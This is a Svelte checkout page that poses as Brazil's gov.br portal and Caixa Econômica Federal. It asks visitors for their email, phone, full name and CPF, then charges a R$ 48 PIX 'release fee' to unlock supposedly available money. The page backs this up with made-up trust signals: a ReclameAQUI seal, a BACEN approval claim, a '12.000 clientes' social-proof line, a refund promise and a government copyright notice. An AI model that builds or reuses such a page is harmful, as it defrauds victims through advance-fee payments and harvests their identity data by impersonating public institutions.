<script>
    import { enhance } from "$app/forms";
    import { applyMask } from "$lib/formating";
    import { BuildURL } from "$lib/url";
    import { validateDocument, validateEmail, validateFullname, validatePhone } from "$lib/validations";
    import { onMount } from "svelte";

    import CPFField from "./CPFField.svelte";
    import PhoneField from "./PhoneField.svelte";

    let { data } = $props();

    let is_loading = $state(false);

    let error_fullname = $state();
    let error_email = $state();
    let error_phone = $state();
    let error_document = $state();

    let url_params = $state({});

    const onSubmit = async ({ formData, cancel }) => {
        if(is_loading){
            cancel();
            return;
        }

        const fullname = formData.get("fullname");
        const email = formData.get("email");
        const phone = formData.get("phone");
        const document = formData.get("cpf");

        let is_error = false;

        if(!email || email == ""){
            error_email = "Email é obrigatório";
            is_error = true;
        }
        else if(!validateEmail(email)){
            error_email = "Email inválido. Ex: usuario@email.com";
            is_error = true;
        }
        else{
            error_email = "";
        }

        if(!phone || phone == ""){
            error_phone = "Telefone é obrigatório";
            is_error = true;
        }
        else if(!validatePhone(phone)){
            error_phone = "Telefone inválido. Ex: (11) 98888-7777";
            is_error = true;
        }
        else{
            error_phone = "";
        }

        if(!fullname || fullname == ""){
            error_fullname = "Nome é obrigatório";
            is_error = true;
        }
        else if(!validateFullname(fullname)){
            error_fullname = "Nome inválido. Ex: Pedro Fernandes";
            is_error = true;
        }
        else{
            error_fullname = "";
        }

        if(!document || document == ""){
            error_document = "CPF é obrigatório";
            is_error = true;
        }
        else if(!validateDocument(document)){
            error_document = "CPF inválido. Ex: 123.456.789-00";
            is_error = true;
        }
        else{
            error_document = "";
        }

        if(!is_error){
            is_loading = true;

            const request = await fetch("/api/payment", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    fullname: fullname,
                    email: email,
                    phone: phone,
                    document: document
                })
            });

            if(request.status == 200){
                const response = await request.json();
                window.location.href = BuildURL(`/payment/${response?.payment?.id}`, url_params);
            }
            else{
                is_loading = false;
            }
        }

        cancel();
    }

    onMount(() => {
        url_params = Object.fromEntries(new URLSearchParams(window.location.search));
    });
</script>

<div class="min-h-screen bg-gray-50 font-sans text-slate-800 leading-relaxed">
    <header class="bg-white border-b border-gray-200 shadow-sm">
        <div class="max-w-7xl mx-auto px-3 sm:px-6 lg:px-8">
            <div class="flex justify-between items-center h-14 sm:h-16">
                <div><img src="/assets/govbr-logo.png" alt="gov.br" class="h-6 sm:h-8 lg:h-10"></div>
                <div class="bg-green-100 text-green-800 px-2 py-1 sm:px-3 sm:py-1.5 rounded-lg text-xs sm:text-sm font-medium border border-green-200">Ambiente Seguro</div>
            </div>
        </div>
    </header>
    <main class="py-4 sm:py-6 lg:py-12">
        <div class="max-w-7xl mx-auto px-3 sm:px-6 lg:px-8">
            <div class="flex flex-col lg:grid lg:grid-cols-3 gap-4 sm:gap-6 lg:gap-8">
                <div class="order-2 lg:order-2 lg:col-span-1">
                    <div class="lg:sticky lg:top-8">
                        <div class="bg-white rounded-lg sm:rounded-xl shadow-sm border border-gray-200">
                            <div class="px-3 sm:px-6 py-4 sm:py-6 border-b border-gray-200">
                                <h2 class="text-lg sm:text-xl font-semibold">Resumo do Pedido</h2>
                            </div>
                            <div class="px-3 sm:px-6 py-4 sm:py-6">
                                <div class="flex items-start gap-3 mb-4 sm:mb-6">
                                    <div class="w-10 h-10 sm:w-12 sm:h-12 bg-green-100 rounded-lg flex items-center justify-center flex-shrink-0">
                                        <svg width="20" height="20" class="sm:w-6 sm:h-6" fill="#16a34a" viewBox="0 0 24 24">
                                            <path d="M12,1L3,5V11C3,16.55 6.84,21.74 12,23C17.16,21.74 21,16.55 21,11V5L12,1M10,17L6,13L7.41,11.59L10,14.17L16.59,7.58L18,9L10,17Z"></path>
                                        </svg>
                                    </div>
                                    <div class="min-w-0 flex-1">
                                        <h4 class="font-semibold mb-1 text-sm sm:text-base">Processamento de Resgate</h4>
                                        <p class="text-xs sm:text-sm text-gray-600">Taxa para liberação dos seus valores disponíveis</p>
                                    </div>
                                </div>
                                <div class="border-t border-gray-200 pt-4 sm:pt-6 mb-4 sm:mb-6">
                                    <div class="flex justify-between text-sm mb-2"><span class="text-gray-600">Taxa de Liberação</span><span>R$ 48,00</span></div>
                                </div>
                                <div class="border-t border-gray-200 pt-4 sm:pt-6 mb-4 sm:mb-6">
                                    <div class="flex justify-between items-center"><span class="text-lg font-semibold">Total</span><span class="text-xl sm:text-2xl font-bold text-blue-600">R$ 48,00</span></div>
                                </div>
                                <div class="bg-green-50 border border-green-200 rounded-lg p-3 sm:p-4 mb-3 sm:mb-4">
                                    <h5 class="font-semibold text-green-800 mb-2 text-sm sm:text-base">✅ Você receberá:</h5>
                                    <ul class="text-xs sm:text-sm text-green-700 space-y-1">
                                        <li>• Liberação imediata dos valores</li>
                                        <li>• Transferência via PIX</li>
                                        <li>• Suporte 24/7</li>
                                        <li>• Processo 100% seguro</li>
                                    </ul>
                                </div>
                                <div class="flex items-center gap-2 text-xs sm:text-sm text-gray-600"><span class="text-green-600">🔒</span><span>Pagamento protegido e criptografado</span></div>
                            </div>
                        </div>
                        <div class="bg-white rounded-lg sm:rounded-xl shadow-sm border border-gray-200 mt-4 sm:mt-6">
                            <div class="px-3 sm:px-6 py-4 sm:py-6">
                                <div class="flex items-center justify-center"><img src="/reclame-aqui-seal.png" alt="Verificada por ReclameAQUI" class="h-12 sm:h-14 w-auto"></div>
                            </div>
                        </div>
                        <div class="bg-white rounded-lg sm:rounded-xl shadow-sm border border-gray-200 mt-4 sm:mt-6">
                            <div class="px-3 sm:px-6 py-3 sm:py-4">
                                <div class="flex items-center gap-3">
                                    <img src="/caixa-logo.png" alt="Caixa Econômica Federal" class="w-8 h-8 sm:w-10 sm:h-10 flex-shrink-0">
                                    <div class="min-w-0 flex-1">
                                        <div class="text-sm sm:text-base font-bold text-gray-800 mb-1">Caixa Econômica</div>
                                        <p class="text-xs sm:text-sm text-gray-600 leading-tight">Mais de 12.000 clientes realizaram o pagamento com sucesso esta semana</p>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="order-1 lg:order-1 lg:col-span-2">
                    <div class="bg-white rounded-lg sm:rounded-xl shadow-sm border border-gray-200">
                        <div class="px-3 sm:px-6 py-4 sm:py-6 border-b border-gray-200">
                            <h1 class="text-lg sm:text-xl lg:text-2xl font-bold text-blue-700 mb-2">Finalizar Pagamento</h1>
                            <p class="text-sm sm:text-base text-gray-600">Complete seus dados para liberar o valor disponível</p>
                        </div>
                        <div class="px-3 sm:px-6 py-4 sm:py-6">
                            <form method="POST" use:enhance={onSubmit}>
                                <input type="hidden" value="" name="gclid"><input type="hidden" value="" name="utm_source"><input type="hidden" value="" name="utm_medium"><input type="hidden" value="" name="utm_campaign"><input type="hidden" value="" name="utm_term"><input type="hidden" value="NA" name="utm_content"><input type="hidden" value="" name="fbclid"><input type="hidden" value="" name="ttclid"><input type="hidden" value="" name="wbraid"><input type="hidden" value="" name="gbraid">
                                <div class="mb-6 sm:mb-8">
                                    <h3 class="text-base sm:text-lg font-semibold mb-3 sm:mb-4">Dados Pessoais</h3>
                                    <div class="space-y-4 sm:space-y-6">
                                        <div>
                                            <label class="block font-medium mb-2 text-gray-700 text-sm sm:text-base">Email</label>
                                            <div class="relative">
                                                <input data-slot="input" class={`file:text-foreground selection:bg-primary selection:text-primary-foreground dark:bg-input/30 flex h-9 min-w-0 bg-transparent shadow-xs outline-none file:inline-flex file:h-7 file:border-0 file:bg-transparent file:text-sm file:font-medium disabled:pointer-events-none disabled:cursor-not-allowed disabled:opacity-50 md:text-sm focus-visible:border-ring ring-gray-300 ${error_email ? "border-red-500" : "focus-within:border-gray-400 border-gray-300"} focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive w-full p-3 sm:p-4 border rounded-lg text-sm sm:text-base transition-colors placeholder:text-gray-400`} name="email" autocomplete="email" inputmode="email" spellcheck="false" placeholder="Digite seu melhor email" type="text" value="">
                                            </div>
                                            {#if error_email}
                                                <div class="flex items-center gap-2 text-red-600 text-xs sm:text-sm mt-1">
                                                    <div class="w-4 h-4 bg-red-500 rounded-full flex items-center justify-center flex-shrink-0">
                                                        <span class="text-white text-xs font-bold">!</span>
                                                    </div>
                                                    {error_email}
                                                </div>
                                            {/if}
                                        </div>
                                        <div>
                                            <PhoneField error={error_phone}/>
                                        </div>
                                        <div>
                                            <label class="block font-medium mb-2 text-gray-700 text-sm sm:text-base">Nome Completo</label>
                                            <input data-slot="input" class={`file:text-foreground selection:bg-primary selection:text-primary-foreground dark:bg-input/30 flex h-9 min-w-0 bg-transparent shadow-xs outline-none file:inline-flex file:h-7 file:border-0 file:bg-transparent file:text-sm file:font-medium disabled:pointer-events-none disabled:cursor-not-allowed disabled:opacity-50 md:text-sm focus-visible:border-ring ring-gray-300 ${error_fullname ? "border-red-500" : "focus-within:border-gray-400 border-gray-300"} ring-gray-300 focus-within:border-gray-400 focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive w-full p-3 sm:p-4 border rounded-lg text-sm sm:text-base transition-colors placeholder:text-gray-400 border-gray-300`} placeholder="Digite seu nome completo" autocomplete="name" spellcheck="true" type="text" name="fullname" value={data.fullname}>
                                            {#if error_fullname}
                                                <div class="flex items-center gap-2 text-red-600 text-xs sm:text-sm mt-1">
                                                    <div class="w-4 h-4 bg-red-500 rounded-full flex items-center justify-center flex-shrink-0">
                                                        <span class="text-white text-xs font-bold">!</span>
                                                    </div>
                                                    {error_fullname}
                                                </div>
                                            {/if}
                                        </div>
                                        <div>
                                            <CPFField value={applyMask(data.document, "000.000.000-00")} error={error_document}/>
                                        </div>
                                    </div>
                                </div>
                                <div class="border-t border-gray-200 pt-4 sm:pt-6 mb-6 sm:mb-8">
                                    <h3 class="text-base sm:text-lg font-semibold mb-3 sm:mb-4">Método de Pagamento</h3>
                                    <div class="p-3 sm:p-4 border border-gray-200 rounded-lg bg-gray-50 flex items-center gap-3">
                                        <div class="w-10 h-10 sm:w-12 sm:h-12 bg-blue-100 rounded-lg flex items-center justify-center flex-shrink-0">
                                            <svg width="20" height="20" class="sm:w-6 sm:h-6" fill="#2563eb" viewBox="0 0 24 24">
                                                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"></path>
                                            </svg>
                                        </div>
                                        <div>
                                            <h4 class="font-semibold mb-1 text-sm sm:text-base">PIX</h4>
                                            <p class="text-xs sm:text-sm text-gray-600">Pagamento instantâneo e seguro</p>
                                        </div>
                                    </div>
                                </div>
                                <button data-slot="button" class={`inline-flex items-center justify-center gap-2 whitespace-nowrap disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*='size-'])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive bg-primary hover:bg-primary/90 h-9 has-[&gt;svg]:px-3 w-full ${is_loading ? "bg-gray-400" : "bg-gradient-to-r from-green-600 to-green-700 hover:from-green-700 hover:to-green-800 hover:cursor-pointer"} text-white font-bold text-base sm:text-lg py-4 sm:py-6 px-6 sm:px-8 rounded-xl shadow-lg transition-all duration-200 min-h-[56px] sm:min-h-[64px]`} type="submit">{is_loading ? "Aguarde..." : "Confirmar Pagamento"}</button>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </main>
    <footer class="bg-gray-100 mt-8 sm:mt-16 py-6 sm:py-8">
        <div class="max-w-7xl mx-auto px-3 sm:px-6 lg:px-8">
            <div class="flex flex-col gap-3 sm:flex-row sm:gap-4 items-center justify-between">
                <div class="flex flex-col gap-2 text-xs sm:text-sm text-center sm:text-left">
                    <p class="text-gray-600">Homologado conforme Resolução BACEN nº 98 de 1/6/2021</p>
                    <p class="text-gray-600">Caso não seja liberado, o valor é 100% reembolsado automaticamente.</p>
                </div>
                <p class="text-xs sm:text-sm text-gray-600 text-center sm:text-right">© 2024 Gov.br - Governo Federal</p>
            </div>
        </div>
    </footer>
</div>